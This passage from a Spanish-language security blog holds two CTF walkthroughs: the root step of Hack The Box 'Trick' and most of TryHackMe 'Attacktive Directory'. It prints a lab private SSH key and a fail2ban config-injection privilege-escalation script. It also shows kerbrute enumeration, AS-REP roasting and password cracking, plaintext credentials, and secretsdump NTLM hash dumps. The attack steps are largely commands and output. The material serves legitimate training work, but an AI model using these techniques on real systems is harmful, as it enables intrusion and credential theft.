&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Apuntamos a sacar la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; del user michael &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/michael/.ssh/id_rsa&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
&lt;span class=&quot;nv&quot;&gt;IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; OPENSSH PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a darle permisos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600 id_rsa&lt;/code&gt; y conectarnos por ssh&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ssh -i id_rsa michael@10.10.11.166                                                                                                                                                                         1 ⚙&lt;/span&gt;
Linux trick 4.19.0-20-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumerar un poco el systema&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;michael@trick:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
Linux trick 4.19.0-20-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux&lt;/span&gt;

michael@trick:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;michael&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;michael&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;michael&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;security&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

michael@trick:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-group&lt;/span&gt; security 2&amp;gt;/dev/null
&lt;span class=&quot;s2&quot;&gt;&quot;/etc/fail2ban/action.d&quot;&lt;/span&gt;

michael@trick:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;michael on trick:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User michael may run the following commands on trick:
    &lt;span class=&quot;s2&quot;&gt;&quot;(root) NOPASSWD: /etc/init.d/fail2ban restart&quot;&lt;/span&gt;

michael@trick:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /etc/fail2ban/
total 60
drwxrwx--- 2 root &lt;span class=&quot;s2&quot;&gt;&quot;security&quot;&lt;/span&gt; 4096 Jun 27 13:39 action.d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Buscando informacion sobre fail2ban encontramos una posible escalada de privilegions atraves del fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iptables-multiport.conf&lt;/code&gt; donde podemos intentar a ejecutar un comando [Configurandolo en este fichero] para posteriormente bruteforcear SSH para que el Fail2ban nos banee y aplique el comando que le inyectamos como el usuario root.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/etc/fail2ban/action.d/iptables-multiport.conf&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /etc/fail2ban/action.d/iptables-multiport.conf
&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/flag.txt
&lt;span class=&quot;nv&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/&amp;lt;iptables&amp;gt; -I f2b-&amp;lt;name&amp;gt; 1 -s &amp;lt;ip&amp;gt; -j &amp;lt;blocktype&amp;gt;/ cat &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;root.txt &amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flag.txt /g&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# instead of &quot;cat \/root\/root.txt &amp;gt; \/tmp\/root.txt&quot; u can use ur own payload&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/fail2ban/action.d/iptables-multiport.conf
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /etc/init.d/fail2ban restart
&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;15
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Done! Brute ssh now! Leave ur hydra or whatever u use just for 1min to work. Check /tmp/flag.txt after&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Conseguimos la Flag.txt&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;michael@trick:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;flag.txt

michael@trick:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt 
02db5c7fa69a5a1xxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Rooteada =) Follow Hard to OSCP&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="Domain" /><category term="Zone" /><category term="Transfer," /><category term="Fuzzing" /><category term="Subdomains," /><category term="SQLI" /><category term="Blind," /><category term="LFI," /><category term="Fail2ban," /><category term="Maquinas" /><category term="Retiradas," /><category term="Writeup" /><summary type="html">Trick ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Search de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/15/Attacktive-Directory.html" rel="alternate" type="text/html" title="Maquina Retirada Search de Hack The Box (Necesario VIP)" /><published>2022-06-15T00:00:00-03:00</published><updated>2022-06-15T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/15/Attacktive-Directory</id><content type="html" xml:base="http://localhost:4000/2022/06/15/Attacktive-Directory.html">&lt;h1 id=&quot;attacktive--try-hack-me&quot;&gt;Attacktive ~ Try Hack Me&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.165.157       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Segundo escaneo para ver los Servicios&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 11:39:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-06-14T11:40:15+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2022-06-13T11:34:00
|_Not valid after:  2022-12-13T11:34:00
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-06-14T11:40:05+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2022-06-14T11:40:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a identificar el nombre de Dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spookysec.local&lt;/code&gt; e introducirlo en nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ping -c 1 spookysec.local
PING spookysec.local (10.10.165.157) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.165.157): icmp_seq=1 ttl=127 time=54.1 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/15/22 - Ronnie Flathers @ropnop

2022/06/15 13:01:07 &amp;gt;  Using KDC(s):
2022/06/15 13:01:07 &amp;gt;   spookysec.local:88

2022/06/15 13:01:07 &amp;gt;  [+] svc-admin has no pre auth required.
2022/06/15 13:01:07 &amp;gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/15 13:01:08 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
2022/06/15 13:01:24 &amp;gt;  [+] VALID USERNAME:       robin@spookysec.local
2022/06/15 13:01:39 &amp;gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/15 13:02:07 &amp;gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/15 13:02:30 &amp;gt;  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/15 13:02:31 &amp;gt;  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/15 13:03:06 &amp;gt;  [+] VALID USERNAME:       James@spookysec.local
2022/06/15 13:04:51 &amp;gt;  [+] VALID USERNAME:       backup@spookysec.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-admin&lt;/code&gt; seria vulnerable a un ataque de ASPREPRoast&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# GetNPUsers.py spookysec.local/ -no-pass -usersfile content/users                                                                                                                                         130 ⨯
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:914d34c23212fbf3ad067101c8f05650$4c8a067f62ae3508879bef3fc92eb8e6b31aa9f616071d47aad50e5ebeab47d5e2bfebdd5aed73a9a79f7eed5ae9a4818ff0c75ac203f1f62ae82053acc1cdde98f24b28afef9eaa67b417e89743b3bc2de9873661a68a95507bf9b27d4d8306b1564b4833c5bcc95eb44e0eb5b49c71c4485e2e616245cae67d8921dc260f61206104cecfd48b30a3033af36836cbded82913910b3ee32623bc10fa12681df67c90f0de13a31b7d18cd5e9900be859894d9725d1044a652c78495f891c8c734762a6284a0f4b05c9460baf31cc56e6aff1911eda33959732d5a8cbb8031ea5649137a63f3d68c9b859f1835652e6e0d6e51
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos Copiamos el Hash y procedemos a crackearlo con la herramienta John&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
&quot;management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)&quot;     
1g 0:00:00:02 DONE (2022-06-15 13:09) 0.3367g/s 1965Kp/s 1965Kc/s 1965KC/s manaia010..mamuchopia9
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos creamos un archivo de credenciales, con las credenciales obtenidas&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc-admin: management2005
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar conectarnos por SMB al recurso Backup con las credenciales Optenidas&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local -r backup
[+] IP: 10.10.165.157:445       Name: spookysec.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        backup                                                  READ ONLY
        .\backup\*
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 21:08:53 2020    backup_credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cuando Procedemos a descargar el archivo obtenemos un problema.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local --download backup/backup_credentials.txt
# du -h 10.10.165.157-backup__credentials.txt                                                                                                                         
0       10.10.165.157-backup__credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos que no funciona correctamente procedo a montarme el recurso compartido con una montura a mi directorio /mnt&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# mount -t cifs //10.10.165.157/backup /mnt/ -o username=&quot;svc-admin&quot;,password=&quot;management2005&quot;,domain=spookysec.local,rw
# ls -la /mnt                     
total 5
drwxr-xr-x  2 root root    0 abr  4  2020 .
drwxr-xr-x 20 root root 4096 may 31 21:36 ..
-rwxr-xr-x  1 root root   48 abr  4  2020 backup_credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a leer el Archivo&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat /mnt/backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

# cat /mnt/backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos guardamos las credenciales en el archivo Creds
Procedemos a enumerar con bloodhound.py el directorio activo&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# python3 bloodhound.py -u svc-admin -p &quot;management2005&quot; -d spookysec.local -ns 10.10.165.157 --zip
INFO: Found AD domain: spookysec.local
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
INFO: Done in 00M 05S
INFO: Compressing output into 20220615135241_bloodhound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez obtendio el .zip procedemos a iniciar Neo4J y bloodhound&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;

Introducimos nuestras credenciales en Neo4J 
Iniciamos el BloodHound desde nuestro directorio /opt/BloodHound he introducimos nuestras credenciales
./BloodHound --no-sandbox 2&amp;gt;/dev/null &amp;amp;                                                                                                                                
[2] 3424

Cargamos nuestro .zip
Marcamos los usuarios que tenemos comprometidos e enumeramos informacion de estos mismos
Vemos que para el Usuario Backup pertenece al grupo de Domain Users.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar ejecutar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Secretsdumps.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# secretsdump.py -just-dc backup:backup2517860@spookysec.local                                                                                                         
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation                                                                                                                                                   
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                         
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                         
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                               
